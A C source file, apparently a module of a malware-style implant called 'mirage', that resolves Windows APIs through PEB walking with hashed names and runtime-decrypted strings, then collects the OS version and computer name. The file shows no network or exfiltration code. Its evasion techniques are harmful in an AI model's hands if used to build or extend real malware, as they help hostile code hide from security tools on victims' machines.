#include "system_info.h"
#include "peb.h"
#include "export_resolve.h"
#include "hash.h"
#include "enc_strings.h"
#include <windows.h>
#include <string.h>
#include <stdio.h>

/* PEB-walk API resolution */
typedef LONG   (WINAPI *pRtlGetVersion)(PRTL_OSVERSIONINFOW);
typedef BOOL   (WINAPI *pGetComputerNameA)(char *, DWORD *);

static struct {
    pRtlGetVersion    pRtlGV;
    pGetComputerNameA pGCN;
    int               ready;
} si_api;

static int si_ensure_api(void) {
    if (si_api.ready) return 1;
    char dll[32];
    enc_decrypt(enc_ntdll, ENC_NTDLL_LEN, dll);
    void *nt = mirage_get_module_by_hash(mirage_encrypted_hash_module(dll));
    if (nt) {
        char fn[32];
        enc_decrypt(enc_RtlGetVersion, ENC_RTLGETVERSION_LEN, fn);
        si_api.pRtlGV = (pRtlGetVersion)mirage_get_function_by_hash(nt, mirage_encrypted_hash_func(fn));
    }
    enc_decrypt(enc_kernel32, ENC_KERNEL32_LEN, dll);
    void *k32 = mirage_get_module_by_hash(mirage_encrypted_hash_module(dll));
    if (k32) {
        char fn[32];
        enc_decrypt(enc_GetComputerNameA, ENC_GETCOMPUTERNAMEA_LEN, fn);
        si_api.pGCN = (pGetComputerNameA)mirage_get_function_by_hash(k32, mirage_encrypted_hash_func(fn));
    }
    if (!si_api.pRtlGV || !si_api.pGCN) return 0;
    si_api.ready = 1;
    return 1;
}

/* Get OS version string */
int mirage_get_os_version(char *buf, size_t buflen) {
    if (!si_ensure_api()) return -1;
    OSVERSIONINFOW vi;
    memset(&vi, 0, sizeof(vi));
    vi.dwOSVersionInfoSize = sizeof(vi);
    
    if (si_api.pRtlGV(&vi) != 0) return -1;
    
    snprintf(buf, buflen, "Windows %lu.%lu (Build %lu)",
             vi.dwMajorVersion, vi.dwMinorVersion, vi.dwBuildNumber);
    return 0;
}

/* Get computer name */
int mirage_get_computer_name(char *buf, size_t buflen) {
    if (!si_ensure_api()) return -1;
    DWORD size = (DWORD)buflen;
    if (!si_api.pGCN(buf, &size)) return -1;
    return 0;
}

/* Collect system information */
int mirage_collect_system_info(char *output, size_t outlen) {
    char os_ver[128] = {0};
    char comp_name[256] = {0};
    
    mirage_get_os_version(os_ver, sizeof(os_ver));
    mirage_get_computer_name(comp_name, sizeof(comp_name));
    
    snprintf(output, outlen, "OS: %s\nComputer: %s\n", os_ver, comp_name);
    return 0;
}
